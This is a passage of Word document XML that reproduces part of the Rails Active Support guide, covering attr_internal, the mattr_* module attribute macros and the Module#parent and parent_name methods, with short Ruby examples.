        </w:rPr>
        <w:t>sprintf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-like format string with a leading </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>%s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> somewhere, which is where the name will be placed. The default is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"@_%s"</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACED25A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails uses internal attributes in a few spots, for examples for views:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="66B707C3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B689047" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionView</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4573B581" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0306FB2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    attr_internal :captures</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DDE6A47" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    attr_internal :request, :layout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="189FEE7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    attr_internal :controller, :template</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A8C9024" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D829C68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16B1B6B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/attr_internal.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABB02B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.3 Module Attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3362F7F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The macros </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>mattr_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>mattr_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>mattr_accessor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are analogous to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cattr_*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> macros defined for class. Check </w:t>
      </w:r>
      <w:hyperlink r:id="rId492" w:anchor="class-attributes" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Class Attributes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CFE3B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, the dependencies mechanism uses them:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7C4E5324" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20600900" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveSupport</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F4601EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Dependencies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BC461B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :warnings_on_first_load</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17E4D4E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :history</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40C7DF88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :loaded</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ED740CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :mechanism</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32DD842A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :load_paths</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7723FF9E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :load_once_paths</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B1251BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :autoloaded_constants</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48D613D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :explicitly_unloadable_constants</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57C37BE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :logger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0174A56F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :log_activity</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72FB515D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :constant_watch_stack</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E6D45EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    mattr_accessor :constant_watch_stack_mutex</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="311FDB08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E227E26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63D87606" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/attribute_accessors.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0234BE64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Parents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C78BF9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5C0091" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on a nested named module returns the module that contains its corresponding constant:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="68471712" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="078EA84D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06DB3B90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2388AF86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DC26199" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35271415" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="373A39E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FCB34D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= X::Y::Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41B62C17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04C632FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X::Y::Z.parent # =&gt; X::Y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="429EFC6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M.parent       # =&gt; X::Y</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A4D0B33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the module is anonymous or belongs to the top-level, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B34818" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that in that case </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E18CC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/introspection.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E2496C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F275E46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on a nested named module returns the fully-qualified name of the module that contains its corresponding constant:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0CB9E55D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74585315" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B783A8C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E6AF8AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78D313BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54A8FC0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71DA2FCC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A68A456" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= X::Y::Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B756190" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="612CC7D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X::Y::Z.parent_name # =&gt; "X::Y"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DFBB776" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M.parent_name       # =&gt; "X::Y"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52A0DCCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For top-level or anonymous modules </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00439146" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that in that case </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B28D404" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/introspection.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
